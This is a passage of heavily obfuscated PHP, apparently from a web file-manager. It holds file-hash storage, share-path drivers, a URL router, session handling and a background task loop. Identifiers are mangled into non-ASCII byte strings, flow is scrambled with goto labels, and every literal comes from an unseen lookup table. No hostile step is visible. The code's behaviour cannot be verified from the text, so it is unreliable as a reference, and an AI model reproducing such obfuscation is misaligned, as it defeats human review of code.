IO::move($AÊå”Ö‘ªÂ, $CÆâ·ƒºéë, !1, $dáíª¥·ê); } else { $C»–âŠÀ = IO::copy($AÊå”Ö‘ªÂ, $CÆâ·ƒºéë, !1, $dáíª¥·ê); } if (!$C»–âŠÀ) { return !1; } goto a¯ÃÍª ÚÑ; dŠ¾äîôš: } public function addFileCheckExist($eº¿øğ†¤—, $CâÂ˜é†´, $cİÀ—É±ÆÀ) { $d«¸ÍóÉˆÔ =& $_SERVER[Äº¡•ô™Ÿ]; $aÊ›ø¬´¨í = $this->findByHash($eº¿øğ†¤—, $CâÂ˜é†´); if (!$aÊ›ø¬´¨í) { return !1; } $EÇ‹íİ¬ƒ = array($d«¸ÍóÉˆÔ[2133] => intval($aÊ›ø¬´¨í[$d«¸ÍóÉˆÔ[2136]]) + 1, $d«¸ÍóÉˆÔ[516] => $cİÀ—É±ÆÀ); $this->where(array($d«¸ÍóÉˆÔ[416] => $aÊ›ø¬´¨í[$d«¸ÍóÉˆÔ[415]]))->save($EÇ‹íİ¬ƒ); return $aÊ›ø¬´¨í; } public function remove($fè‰âÖ“Ş) { $this->linkCountChange($fè‰âÖ“Ş, !1); $this->clearEmpty(); return !0; } public function linkAdd($Fˆ‘‚‘öÁ‰) { $this->linkCountChange($Fˆ‘‚‘öÁ‰, !0); } public function linkCountChange($a·®İµ¿†ˆ, $aå«—Ü‹Ë) { goto aŞÍÓˆÒ; aŞÍÓˆÒ: $aÎÒ —“á =& $_SERVER[Äº¡•ô™Ÿ]; if (!$a·®İµ¿†ˆ) { return; } if (!is_array($a·®İµ¿†ˆ)) { $a·®İµ¿†ˆ = array($a·®İµ¿†ˆ); } goto BŠÉ¹Øå¬Ç; c¼Ç²„†›İ: foreach ($b–ìí”ğäˆ as $Cëˆ™é„»˜ => $CÇ†Úã™×) { $b“¸Ù…Â¾Ì = $CÇ†Úã™× . $aÎÒ —“á[33]; if (!$AØÀÂõ±•Ì[$b“¸Ù…Â¾Ì]) { $AØÀÂõ±•Ì[$b“¸Ù…Â¾Ì] = array(); } $AØÀÂõ±•Ì[$b“¸Ù…Â¾Ì][] = $Cëˆ™é„»˜; } foreach ($AØÀÂõ±•Ì as $CÇ†Úã™× => $Fƒ˜İï¼É) { if (!$Fƒ˜İï¼É) { continue; } $CÇ†Úã™× = $aå«—Ü‹Ë ? $CÇ†Úã™× : -intval($CÇ†Úã™×); $cù‚–„ç¿ = array($aÎÒ —“á[415] => array($aÎÒ —“á[7], $Fƒ˜İï¼É)); if ($CÇ†Úã™× < 0) { $cù‚–„ç¿[$aÎÒ —“á[2136]] = array($aÎÒ —“á[931], abs($CÇ†Úã™×)); } $this->where($cù‚–„ç¿)->setAdd($aÎÒ —“á[2136], $CÇ†Úã™×); } goto D×»ñ¦½ÍÍ; BŠÉ¹Øå¬Ç: $b–ìí”ğäˆ = array(); foreach ($a·®İµ¿†ˆ as $Cëˆ™é„»˜) { $b“¸Ù…Â¾Ì = $Cëˆ™é„»˜ . $aÎÒ —“á[33]; if (!$b–ìí”ğäˆ[$b“¸Ù…Â¾Ì]) { $b–ìí”ğäˆ[$b“¸Ù…Â¾Ì] = 0; } $b–ìí”ğäˆ[$b“¸Ù…Â¾Ì]++; } $AØÀÂõ±•Ì = array(); goto c¼Ç²„†›İ; D×»ñ¦½ÍÍ: } public function findByHash($dŸ²Œø…ÜÉ, $E¡ºìÆÆª = false) { $F—ÊÜÌÄ˜ß =& $_SERVER[Äº¡•ô™Ÿ]; if (!$dŸ²Œø…ÜÉ && !$E¡ºìÆÆª) { return !1; } $AºÂø®Ö—Œ = array($F—ÊÜÌÄ˜ß[2134] => $dŸ²Œø…ÜÉ); if ($E¡ºìÆÆª) { $AºÂø®Ö—Œ = array($F—ÊÜÌÄ˜ß[2135] => $E¡ºìÆÆª); } return $this->order($F—ÊÜÌÄ˜ß[2137])->where($AºÂø®Ö—Œ)->find(); } public function clearEmpty($Aù¢®âç¿ = 0) { goto c½»¯ÉÀ¿À; C‰»Í¹–¹ë: foreach ($EÖÍß¢Ëõ as $e–†›ŸÓ»©) { $C·ã§èáÆ->update(1); $this->resetFile($e–†›ŸÓ»©); } $C·ã§èáÆ->end(); goto D½‰’åŠ­; BíåÕÆª: $EÖÍß¢Ëõ = $this->where($BĞê¦Ş·ò¸)->select(); if (!$EÖÍß¢Ëõ) { return; } $C·ã§èáÆ = new Task($A­¤àÙ±Ò£[2139], $A­¤àÙ±Ò£[33], count($EÖÍß¢Ëõ)); goto C‰»Í¹–¹ë; c½»¯ÉÀ¿À: $A­¤àÙ±Ò£ =& $_SERVER[Äº¡•ô™Ÿ]; $f­òôÆ¸÷ß = time() - 3600 * 24 * $Aù¢®âç¿; $BĞê¦Ş·ò¸ = $A­¤àÙ±Ò£[2138] . $f­òôÆ¸÷ß; goto BíåÕÆª; D½‰’åŠ­: } private function resetFile($fó®ôçô¦Ù) { goto eÕˆõ‡ˆÒ‡; BÈñ¹áÌùø: $f½º‰Ï¨ƒ‰ = Model($fÓÅ·‚Ÿ´[2140])->where($Cšˆš‰†°)->count(); $E‰²Áê½Ÿ¦ = intval($bÓ‰Ö¶¨Õ÷) + intval($f½º‰Ï¨ƒ‰); if ($E‰²Áê½Ÿ¦ == 0) { IO::remove($fó®ôçô¦Ù[$fÓÅ·‚Ÿ´[75]]); $this->where($Cšˆš‰†°)->delete(); $this->metaSet($fó®ôçô¦Ù[$fÓÅ·‚Ÿ´[415]], null, null); return; } goto fŞä‹‡°ñ¾; eÕˆõ‡ˆÒ‡: $fÓÅ·‚Ÿ´ =& $_SERVER[Äº¡•ô™Ÿ]; $Cšˆš‰†° = array($fÓÅ·‚Ÿ´[416] => $fó®ôçô¦Ù[$fÓÅ·‚Ÿ´[415]]); $bÓ‰Ö¶¨Õ÷ = Model($fÓÅ·‚Ÿ´[1110])->where($Cšˆš‰†°)->count(); goto BÈñ¹áÌùø; fŞä‹‡°ñ¾: if ($fó®ôçô¦Ù[$fÓÅ·‚Ÿ´[2136]] != $E‰²Áê½Ÿ¦) { $this->where($Cšˆš‰†°)->save(array($fÓÅ·‚Ÿ´[2133] => $E‰²Áê½Ÿ¦)); } goto d´µ…‡©£Œ; d´µ…‡©£Œ: } public function storageInfo($bãØŠŸœ‘ = false) { goto E±öóƒÏã; C÷áŠñ¶£¾: $Eí…Ü„¹ = 1; $B”¸‹Óåö‡ = 0; $eøò¤¯©Óë = 5000; goto AŞƒøŸÉÊ; E±öóƒÏã: $e›«®ôâ»î =& $_SERVER[Äº¡•ô™Ÿ]; $D…ç¶İËÖè = $this->count() + 0.0; $CÍÉ¿„‚Ÿ = 0; goto C÷áŠñ¶£¾; AŞƒøŸÉÊ: for ($e¤à‹“¹ª® = 0; $e¤à‹“¹ª® < $D…ç¶İËÖè; $e¤à‹“¹ª® = $e¤à‹“¹ª® + $eøò¤¯©Óë) { $DÛ¨­ì¸É = $this->limit($e¤à‹“¹ª®, $e¤à‹“¹ª® + $eøò¤¯©Óë)->select(); foreach ($DÛ¨­ì¸É as $aôŸîêá ) { $Eí…Ü„¹ += $aôŸîêá [$e›«®ôâ»î[77]] * $aôŸîêá [$e›«®ôâ»î[2136]]; $CÍÉ¿„‚Ÿ += $aôŸîêá [$e›«®ôâ»î[77]] * ($aôŸîêá [$e›«®ôâ»î[2136]] - 1); $B”¸‹Óåö‡ += $aôŸîêá [$e›«®ôâ»î[2136]]; } } $B©»¦£¿á = array($e›«®ôâ»î[2141] => $Eí…Ü„¹, $e›«®ôâ»î[2142] => $CÍÉ¿„‚Ÿ, $e›«®ôâ»î[2143] => $CÍÉ¿„‚Ÿ / $Eí…Ü„¹, $e›«®ôâ»î[81] => $D…ç¶İËÖè, $e›«®ôâ»î[2144] => $B”¸‹Óåö‡); return $B©»¦£¿á; goto F…¿Ìêğçè; F…¿Ìêğçè: } } goto Dõ¬ÑšÅ´Û; EÈÇ·¹Ÿë: class PathDriverDbShareItem extends PathDriverDB { public function __construct($C‚ ¯”ÄÑØ) { $this->pathParse = $C‚ ¯”ÄÑØ; $this->model = Model($_SERVER[Äº¡•ô™Ÿ][1110]); } public function getPathOuter($BÒì¥¯Ê˜¾) { $f²Ä¸¶ÕÂÇ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$BÒì¥¯Ê˜¾) { return $BÒì¥¯Ê˜¾; } $cÄ¡à–²¬ = $this->parse($BÒì¥¯Ê˜¾); return trim(KodIO::makeShare($this->pathParse[$f²Ä¸¶ÕÂÇ[364]], $cÄ¡à–²¬[$f²Ä¸¶ÕÂÇ[364]]), $f²Ä¸¶ÕÂÇ[8]); } protected function infoParse($D™¦»øÉ÷, $cœğ§²É¤µ = false, $AæÓ˜øÁÊ— = false) { $Eíõõ¸è«ˆ =& $_SERVER[Äº¡•ô™Ÿ]; $BÔÂâ¹Õ‘ = $this->pathParse[$Eíõõ¸è«ˆ[364]]; $aã•ğÚĞ†÷ = trim($this->pathParse[$Eíõõ¸è«ˆ[1011]], $Eíõõ¸è«ˆ[8]); return Action($Eíõõ¸è«ˆ[1116])->sharePathInfo($BÔÂâ¹Õ‘, $aã•ğÚĞ†÷); } public function infoFull($CªÃÄôƒ¬Ú) { $FäÙ×‹È­Ö =& $_SERVER[Äº¡•ô™Ÿ]; $fĞïíùË¡ = explode($FäÙ×‹È­Ö[8], trim($CªÃÄôƒ¬Ú, $FäÙ×‹È­Ö[8])); if (count($fĞïíùË¡) > 1) { $CçÉª½ˆ«º = implode($FäÙ×‹È­Ö[8], array_splice($fĞïíùË¡, 1)); $E­ÌƒÆóœ„ = $this->model->pathInfoByPath($fĞïíùË¡[0], $CçÉª½ˆ«º); if (!$E­ÌƒÆóœ„) { return !1; } $this->pathParse[$FäÙ×‹È­Ö[1011]] = $E­ÌƒÆóœ„[$FäÙ×‹È­Ö[366]]; } return $this->infoParse($CªÃÄôƒ¬Ú); } public function listAll($CŒ§í‰´ë) { goto B­Šƒ¶µÆ; B­Šƒ¶µÆ: $DÉô˜›¿™Ë =& $_SERVER[Äº¡•ô™Ÿ]; $Báá¨Œ˜‡Ì = IO::info($this->pathParse[$DÉô˜›¿™Ë[75]]); if (!$Báá¨Œ˜‡Ì) { return array(); } goto A¼÷èÅ«íß; A¼÷èÅ«íß: $a’×«Œ’ßµ = $this->model->listAll($CŒ§í‰´ë); $bæù÷¶Â¨ = Model($DÉô˜›¿™Ë[532])->getInfo($Báá¨Œ˜‡Ì[$DÉô˜›¿™Ë[437]]); $fÛ•äÆº = Action($DÉô˜›¿™Ë[1116]); goto Aœ·£‚¿µ®; Aœ·£‚¿µ®: foreach ($a’×«Œ’ßµ as &$eËàô˜ÛÉ) { check_abort(); $eËàô˜ÛÉ[$DÉô˜›¿™Ë[388]] = $fÛ•äÆº->_shareItemeParse($eËàô˜ÛÉ[$DÉô˜›¿™Ë[388]], $bæù÷¶Â¨); } return $a’×«Œ’ßµ; goto F—ŸŠ¬˜†ã; F—ŸŠ¬˜†ã: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($D’çÄÇÏ¹†) { $this->pathParse = $D’çÄÇÏ¹†; $this->model = Model($_SERVER[Äº¡•ô™Ÿ][1110]); } protected function infoParse($fÀæôÌ°£×, $CŞïïğÄ‘ = false, $Bµ¡Œò¥Û = false) { $AÏ¨ÃÃñÓè =& $_SERVER[Äº¡•ô™Ÿ]; return Action($AÏ¨ÃÃñÓè[1017])->sharePathInfo($this->pathParse[$AÏ¨ÃÃñÓè[75]], !0); } public function listPath($AÅÏóéîìÅ, $BµêÏ“½ğó = false) { $DÍšõá‡Ãá =& $_SERVER[Äº¡•ô™Ÿ]; $E¿®±¹ »Û = parent::listPath($AÅÏóéîìÅ, $BµêÏ“½ğó); foreach ($E¿®±¹ »Û as $a½ƒË¨¿À˜ => $Fª±˜Ê‘Î) { if (!in_array($a½ƒË¨¿À˜, array($DÍšõá‡Ãá[73], $DÍšõá‡Ãá[74]))) { continue; } foreach ($Fª±˜Ê‘Î as $câ–¦•Å§´ => $b–¥¬—ÔÊª) { $E¿®±¹ »Û[$a½ƒË¨¿À˜][$câ–¦•Å§´] = Action($DÍšõá‡Ãá[1017])->shareItemInfo($b–¥¬—ÔÊª); } } return $E¿®±¹ »Û; } public function listAll($b•İ‹ˆ) { $AªùÃ®˜ ¼ =& $_SERVER[Äº¡•ô™Ÿ]; $e›ë‚Ö…»Ü = IO::info($this->pathParse[$AªùÃ®˜ ¼[75]]); if (!$e›ë‚Ö…»Ü) { return array(); } $DË†¡†¢õ÷ = $this->model->listAll($b•İ‹ˆ); foreach ($DË†¡†¢õ÷ as &$Cš‘ÒÓê) { $Cš‘ÒÓê[$AªùÃ®˜ ¼[388]] = Action($AªùÃ®˜ ¼[1017])->shareItemInfo($Cš‘ÒÓê[$AªùÃ®˜ ¼[388]]); } return $DË†¡†¢õ÷; } } class PathDriverDriverShareItem { public function __construct($FĞºÁƒß) { $this->pathParse = $FĞºÁƒß; } public function __call($eÊƒ´Å¶‰š, $eŒ›î‘èÃ) { $eëµí‡„Ü£ =& $_SERVER[Äº¡•ô™Ÿ]; if (method_exists($this, $eÊƒ´Å¶‰š)) { return; } $dÃŒïáâ = call_user_func_array(array($eëµí‡„Ü£[1117], $eÊƒ´Å¶‰š), $eŒ›î‘èÃ); $CƒÎö”©Ã = array($eëµí‡„Ü£[1118], $eëµí‡„Ü£[1119], $eëµí‡„Ü£[1120], $eëµí‡„Ü£[1121], $eëµí‡„Ü£[486], $eëµí‡„Ü£[488], $eëµí‡„Ü£[1122], $eëµí‡„Ü£[91], $eëµí‡„Ü£[1123], $eëµí‡„Ü£[1124]); if (in_array($eÊƒ´Å¶‰š, $CƒÎö”©Ã)) { $dÃŒïáâ = $this->getPathOuter($dÃŒïáâ); } return $dÃŒïáâ; } public function copy($BĞÓ™ÖµÛ¢, $FºÎâ‹‰‹ã, $cˆïƒéŠ„ = false) { return $this->copyMove($BĞÓ™ÖµÛ¢, $FºÎâ‹‰‹ã, $cˆïƒéŠ„, $_SERVER[Äº¡•ô™Ÿ][486]); } public function move($f¤¯İÎßˆ», $B¤®¶‚’ƒ, $fùœ¼Ø¢§Ë = false) { return $this->copyMove($f¤¯İÎßˆ», $B¤®¶‚’ƒ, $fùœ¼Ø¢§Ë, $_SERVER[Äº¡•ô™Ÿ][488]); } private function copyMove($CÎ·‹ÔÏê, $CÕæÌ£µÃÖ, $B«˜˜ Ì²”, $Bîİ”«Ã×‘) { goto D¨ÆŠ·Á£±; EÔÍÙÄ¼‹: return $A“œ¿µæ; goto fÚÊ„“Ä³; D¨ÆŠ·Á£±: $dÖÊƒ·¿âç =& $_SERVER[Äº¡•ô™Ÿ]; $F–ÙÎÂ‘• = $CÕæÌ£µÃÖ; $E°¶°÷å£ = IO::driverMake($CÕæÌ£µÃÖ); goto DÇ¶øÈÄ×¦; DÇ¶øÈÄ×¦: if ($E°¶°÷å£->pathParse[$dÖÊƒ·¿âç[998]]) { $CÕæÌ£µÃÖ = $E°¶°÷å£->pathParse[$dÖÊƒ·¿âç[998]]; } else { $CÕæÌ£µÃÖ = $F–ÙÎÂ‘•; } $A“œ¿µæ = IO::copyMove($CÎ·‹ÔÏê, $CÕæÌ£µÃÖ, $B«˜˜ Ì²”, $Bîİ”«Ã×‘); $A“œ¿µæ = $this->getPathOuter($A“œ¿µæ); goto EÔÍÙÄ¼‹; fÚÊ„“Ä³: } public function pathFather($aè‹«ÄÀ¾Ç) { return get_path_father($this->pathParse[$_SERVER[Äº¡•ô™Ÿ][75]]); } public function iconvSystem($cÄØ°‚‰) { return $cÄØ°‚‰; } protected function infoParse($D«†œÊ—Ù˜) { $DÊ¢Úà®Ù =& $_SERVER[Äº¡•ô™Ÿ]; $a×Şƒ·Ò—¨ = $this->pathParse[$DÊ¢Úà®Ù[435]][$DÊ¢Úà®Ù[1018]] . $this->pathParse[$DÊ¢Úà®Ù[1011]]; $D˜ÊÛ±Éš‚ = IO::info($a×Şƒ·Ò—¨); $cåÕ¢‡ª = $this->pathParse[$DÊ¢Úà®Ù[435]]; return Action($DÊ¢Úà®Ù[1116])->_shareItemeParse($D˜ÊÛ±Éš‚, $cåÕ¢‡ª); } public function listAll($F¤Ï†«Ö¦) { $B„½æ“±á =& $_SERVER[Äº¡•ô™Ÿ]; $B—«Âº°à = IO::listAll($F¤Ï†«Ö¦); $A»´ã„Ôì³ = $this->pathParse[$B„½æ“±á[435]]; foreach ($B—«Âº°à as &$eÖ¸İ²„¼) { check_abort(); $eÖ¸İ²„¼ = array_merge(IO::info($eÖ¸İ²„¼[$B„½æ“±á[75]]), $eÖ¸İ²„¼); $eÖ¸İ²„¼[$B„½æ“±á[388]] = Action($B„½æ“±á[1116])->_shareItemeParse($eÖ¸İ²„¼, $A»´ã„Ôì³); } return $B—«Âº°à; } public function getPathOuter($b‹º»š«íá) { goto F«µ—ŒŠõÔ; Eè÷Ëƒ£‹×: $eŒÜÙ·¿ÆÔ = KodIO::clear($b‹º»š«íá); $AŠéìËÔÂÙ = KodIO::clear($this->pathParse[$dŞ‡‹È¦Á[435]][$dŞ‡‹È¦Á[1018]]); $AÅ –çåóµ = substr($eŒÜÙ·¿ÆÔ, strlen($AŠéìËÔÂÙ)); goto EâÁ¤ïŒôÖ; F«µ—ŒŠõÔ: $dŞ‡‹È¦Á =& $_SERVER[Äº¡•ô™Ÿ]; $c¼ƒÍèÆ» = KodIO::parse($b‹º»š«íá); if ($c¼ƒÍèÆ»[$dŞ‡‹È¦Á[29]] == KodIO::KOD_SHARE_ITEM) { return $c¼ƒÍèÆ»[$dŞ‡‹È¦Á[75]]; } goto Eè÷Ëƒ£‹×; EâÁ¤ïŒôÖ: if (substr($eŒÜÙ·¿ÆÔ, 0, strlen($AŠéìËÔÂÙ)) != $AŠéìËÔÂÙ) { return !1; } return $this->pathParse[$dŞ‡‹È¦Á[1012]] . $dŞ‡‹È¦Á[8] . ltrim($AÅ –çåóµ, $dŞ‡‹È¦Á[8]); goto e·¨–•èÆ§; e·¨–•èÆ§: } public function getType() { $C† ÏĞˆËë =& $_SERVER[Äº¡•ô™Ÿ]; $aÆ¦¨³‰‹ = str_replace($C† ÏĞˆËë[71], $C† ÏĞˆËë[33], get_class($this)); return strtolower($aÆ¦¨³‰‹); } public function isTypeObject($fŒ†¦ñ£›ˆ) { return IO::isTypeObject($fŒ†¦ñ£›ˆ); } public function info($EÑëœÇÜ¼) { return $this->infoParse($EÑëœÇÜ¼); } public function infoAuth($cŞ–¸ÆÃÜê) { return $this->infoParse($cŞ–¸ÆÃÜê); } public function infoWithChildren($dóŒùî²—¢) { return $this->infoParse($dóŒùî²—¢); } public function infoFull($A¶ïÉ‚®ä) { return $this->infoParse($A¶ïÉ‚®ä); } } goto f±³²È‰ƒ×; FÂÜÉÓî¾½: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\x5b\x5e\x2f\135\53", "\x3a\156\165\155" => "\x5b\x30\x2d\x39\135\x2b", "\x3a\x61\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($c«ÀÄ¢ã¢, $D®÷ŠøÔ‰î) { $EÓˆŒºŞ±ã =& $_SERVER[Äº¡•ô™Ÿ]; if ($c«ÀÄ¢ã¢ == $EÓˆŒºŞ±ã[1365]) { $fÂ•©¶­ä¾ = array_map($EÓˆŒºŞ±ã[1366], $D®÷ŠøÔ‰î[0]); $E¢‹õÙ¢í = strpos($D®÷ŠøÔ‰î[1], $EÓˆŒºŞ±ã[8]) === 0 ? $D®÷ŠøÔ‰î[1] : $EÓˆŒºŞ±ã[8] . $D®÷ŠøÔ‰î[1]; $aÍˆ¬Ÿñï = $D®÷ŠøÔ‰î[2]; } else { $fÂ•©¶­ä¾ = null; $E¢‹õÙ¢í = strpos($D®÷ŠøÔ‰î[0], $EÓˆŒºŞ±ã[8]) === 0 ? $D®÷ŠøÔ‰î[0] : $EÓˆŒºŞ±ã[8] . $D®÷ŠøÔ‰î[0]; $aÍˆ¬Ÿñï = $D®÷ŠøÔ‰î[1]; } array_push(self::$maps, $fÂ•©¶­ä¾); array_push(self::$routes, $E¢‹õÙ¢í); array_push(self::$methods, strtoupper($c«ÀÄ¢ã¢)); array_push(self::$callbacks, $aÍˆ¬Ÿñï); } public static function error($c–„ ¼²¿) { self::$errorCallback = $c–„ ¼²¿; } public static function haltOnMatch($d‚íîİ²É = true) { self::$halts = $d‚íîİ²É; } public static function dispatch() { goto A¯¬—…›¦‡; A¯¬—…›¦‡: $dŞà•…‡™– =& $_SERVER[Äº¡•ô™Ÿ]; $fÂÚŸ‚ß‘œ = parse_url($_SERVER[$dŞà•…‡™–[1367]], PHP_URL_PATH); $BˆÁƒ¹Š³ö = $_SERVER[$dŞà•…‡™–[151]]; goto BŸ¶ŸÃˆ¹; BŸ¶ŸÃˆ¹: $B‘Šõ°‘– = array_keys(static::$patterns); $føŒ„‘«Úé = array_values(static::$patterns); $f´Ñ‰ô«’” = !1; goto Cò³«Ÿ…•í; Cò³«Ÿ…•í: self::$routes = preg_replace($dŞà•…‡™–[1073], $dŞà•…‡™–[8], self::$routes); if (in_array($fÂÚŸ‚ß‘œ, self::$routes)) { $A´Ôó¯·¶ = array_keys(self::$routes, $fÂÚŸ‚ß‘œ); foreach ($A´Ôó¯·¶ as $bÇÃª„Ş¬) { if (self::$methods[$bÇÃª„Ş¬] == $BˆÁƒ¹Š³ö || self::$methods[$bÇÃª„Ş¬] == $dŞà•…‡™–[1368] || in_array($BˆÁƒ¹Š³ö, self::$maps[$bÇÃª„Ş¬])) { $f´Ñ‰ô«’” = !0; if (!is_object(self::$callbacks[$bÇÃª„Ş¬])) { $eî´Œ–Æ­À = explode($dŞà•…‡™–[8], self::$callbacks[$bÇÃª„Ş¬]); $b§©ßÁçŒ¦ = end($eî´Œ–Æ­À); $f¾âÊ£„À = explode($dŞà•…‡™–[1369], $b§©ßÁçŒ¦); $F¤ŒéÜ¾§ = new $f¾âÊ£„À[0](); $F¤ŒéÜ¾§->{$f¾âÊ£„À[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$bÇÃª„Ş¬]); if (self::$halts) { return; } } } } } else { $FâÒÏªáç = 0; foreach (self::$routes as $bÇÃª„Ş¬) { if (strpos($bÇÃª„Ş¬, $dŞà•…‡™–[4]) !== !1) { $bÇÃª„Ş¬ = str_replace($B‘Šõ°‘–, $føŒ„‘«Úé, $bÇÃª„Ş¬); } if (preg_match($dŞà•…‡™–[1370] . $bÇÃª„Ş¬ . $dŞà•…‡™–[1371], $fÂÚŸ‚ß‘œ, $F¯¦…Ø£‡¥)) { if (self::$methods[$FâÒÏªáç] == $BˆÁƒ¹Š³ö || self::$methods[$FâÒÏªáç] == $dŞà•…‡™–[1368] || !empty(self::$maps[$FâÒÏªáç]) && in_array($BˆÁƒ¹Š³ö, self::$maps[$FâÒÏªáç])) { $f´Ñ‰ô«’” = !0; array_shift($F¯¦…Ø£‡¥); if (!is_object(self::$callbacks[$FâÒÏªáç])) { $eî´Œ–Æ­À = explode($dŞà•…‡™–[8], self::$callbacks[$FâÒÏªáç]); $b§©ßÁçŒ¦ = end($eî´Œ–Æ­À); $f¾âÊ£„À = explode($dŞà•…‡™–[1369], $b§©ßÁçŒ¦); $F¤ŒéÜ¾§ = new $f¾âÊ£„À[0](); if (!method_exists($F¤ŒéÜ¾§, $f¾âÊ£„À[1])) { echo $dŞà•…‡™–[1372]; } else { call_user_func_array(array($F¤ŒéÜ¾§, $f¾âÊ£„À[1]), $F¯¦…Ø£‡¥); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$FâÒÏªáç], $F¯¦…Ø£‡¥); if (self::$halts) { return; } } } } $FâÒÏªáç++; } } if ($f´Ñ‰ô«’” == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $e‡¹¸é©Ï =& $_SERVER[Äº¡•ô™Ÿ]; header($_SERVER[$e‡¹¸é©Ï[1373]] . $e‡¹¸é©Ï[1374]); echo $e‡¹¸é©Ï[1375]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$dŞà•…‡™–[1367]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto dÇá„·ºËÔ; dÇá„·ºËÔ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto däõ½ß„„Š; d‘¨½¾—ø…: $aÉ– ¬ˆ‰ = $GLOBALS[$b¿‚Åíò‘’[6]][$b¿‚Åíò‘’[334]]; self::$sessionTime = $aÉ– ¬ˆ‰[$b¿‚Åíò‘’[1376]]; $eÖáª‡«›‰ = SESSION_ID; goto Fù·‰óÅÅ; däõ½ß„„Š: $b¿‚Åíò‘’ =& $_SERVER[Äº¡•ô™Ÿ]; static $añˆÑÙÍÎÜ = false; if ($añˆÑÙÍÎÜ) { return $añˆÑÙÍÎÜ; } goto d‘¨½¾—ø…; c‰µ¬»Í²¦: switch ($f­Â¿³¹ÚÆ) { case $b¿‚Åíò‘’[17]: self::$handle = Model($b¿‚Åíò‘’[758]); break; case $b¿‚Åíò‘’[759]: self::$handle = new CacheRedis($Fà¿¼Œ¿³Ä, $b×ˆ¹©‡è‹); break; case $b¿‚Åíò‘’[760]: self::$handle = new CacheMemcached($Fà¿¼Œ¿³Ä, $b×ˆ¹©‡è‹); break; case $b¿‚Åíò‘’[164]: $Fà¿¼Œ¿³Ä[$b¿‚Åíò‘’[75]] = $Fà¿¼Œ¿³Ä[$b¿‚Åíò‘’[75]] . $b¿‚Åíò‘’[1379]; self::$handle = new CacheFile($Fà¿¼Œ¿³Ä, $b×ˆ¹©‡è‹); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $añˆÑÙÍÎÜ = new self(); goto F½Œ™ŸË†; Fù·‰óÅÅ: $eÖáª‡«›‰ = _get($GLOBALS, $b¿‚Åíò‘’[1377], $eÖáª‡«›‰); if (self::$sessionSign) { } else { if (Cookie::get($eÖáª‡«›‰)) { self::$sessionSign = Cookie::get($eÖáª‡«›‰); } else { self::$sessionSign = guid(); } } Cookie::setSafe($eÖáª‡«›‰, self::$sessionSign, self::$sessionTime); goto b­É±…¸ô; b­É±…¸ô: $f­Â¿³¹ÚÆ = $aÉ– ¬ˆ‰[$b¿‚Åíò‘’[1378]]; $Fà¿¼Œ¿³Ä = $aÉ– ¬ˆ‰[$f­Â¿³¹ÚÆ]; $b×ˆ¹©‡è‹ = $aÉ– ¬ˆ‰[$b¿‚Åíò‘’[757]]; goto c‰µ¬»Í²¦; F½Œ™ŸË†: return $añˆÑÙÍÎÜ; goto Dãšäµ‡ƒö; Dãšäµ‡ƒö: } public static function sign($dª’àåÃ¬ = false) { $dª’àåÃ¬ && (self::$sessionSign = $dª’àåÃ¬); self::init(); return self::$sessionSign; } public static function set($B«Ã°×ğÉŞ, $Cà†ÌÔ” = false) { self::init(); if (is_array($B«Ã°×ğÉŞ)) { foreach ($B«Ã°×ğÉŞ as $A«àË˜Ïà => $B¬»£µªö) { array_set_value(self::$data, $A«àË˜Ïà, $B¬»£µªö); } } else { array_set_value(self::$data, $B«Ã°×ğÉŞ, $Cà†ÌÔ”); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($f‡ô’Î°ˆó = false) { self::init(); if (!$f‡ô’Î°ˆó) { return self::$data; } return array_get_value(self::$data, $f‡ô’Î°ˆó); } public static function remove($bØ”Š˜È÷) { self::init(); unset(self::$data[$bØ”Š˜È÷]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Äº¡•ô™Ÿ][762])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto Aˆ‰æÕà¦¼; d•óšÕ¥Šä: http_close(); self::valueSet($FªƒŒñì‚[1380], $FªƒŒñì‚[83]); Hook::bind($FªƒŒñì‚[1382], $FªƒŒñì‚[1383]); goto dÈà„·Ê’¦; dÈà„·Ê’¦: while (!0) { self::cacheClear(); if (self::valueGet($FªƒŒñì‚[692]) != $FªƒŒñì‚[83]) { self::valueSet($FªƒŒñì‚[1380], $FªƒŒñì‚[464]); self::log($FªƒŒñì‚[1384]); die; } self::valueSet($FªƒŒñì‚[1380], $FªƒŒñì‚[83]); self::valueSet($FªƒŒñì‚[1381], time()); self::taskRunAll(); sleep(self::valueGet($FªƒŒñì‚[1385])); } goto fÖùçêõÜ½; Aˆ‰æÕà¦¼: $FªƒŒñì‚ =& $_SERVER[Äº¡•ô™Ÿ]; if (self::valueGet($FªƒŒñì‚[692]) != $FªƒŒñì‚[83]) { return; } if (self::valueGet($FªƒŒñì‚[1380]) == $FªƒŒñì‚[83]) { $aÈ¯¼Áè® = self::valueGet($FªƒŒñì‚[1381]); if (time() - $aÈ¯¼Áè® > 3600 * 2) { self::restart(); } return; } goto d•óšÕ¥Šä; fÖùçêõÜ½: } public static function restart() { $AÄ¼ãğÌì =& $_SERVER[Äº¡•ô™Ÿ]; http_close(); self::valueSet($AÄ¼ãğÌì[692], $AÄ¼ãğÌì[464]); sleep(self::valueGet($AÄ¼ãğÌì[1385]) + 5); self::valueSet($AÄ¼ãğÌì[1380], $AÄ¼ãğÌì[464]); self::valueSet($AÄ¼ãğÌì[692], $AÄ¼ãğÌì[83]); } public static function shutdownEvent() { 